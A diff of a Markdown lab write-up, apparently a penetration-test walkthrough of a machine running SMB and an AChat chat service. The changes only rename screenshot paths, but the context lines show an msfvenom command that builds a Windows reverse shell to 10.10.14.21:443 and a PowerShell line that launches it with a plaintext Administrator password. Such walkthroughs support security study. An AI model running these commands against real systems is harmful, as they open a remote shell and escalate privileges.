@@ -67,7 +67,7 @@ Notes:
 
 * I attemped to list the SMB shares and map them out, but I keep getting a strange error upon doing so...
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (7).png" alt=""><figcaption></figcaption></figure>
 
 ### Port 9255 & 9256 AChat Chat System
 
@@ -215,4 +215,4 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 -f exe > shell
 powershell -c "$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('Administrator', $password);Start-Process -FilePath "shell.exe" -Credential $creds"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (8).png" alt=""><figcaption></figcaption></figure>
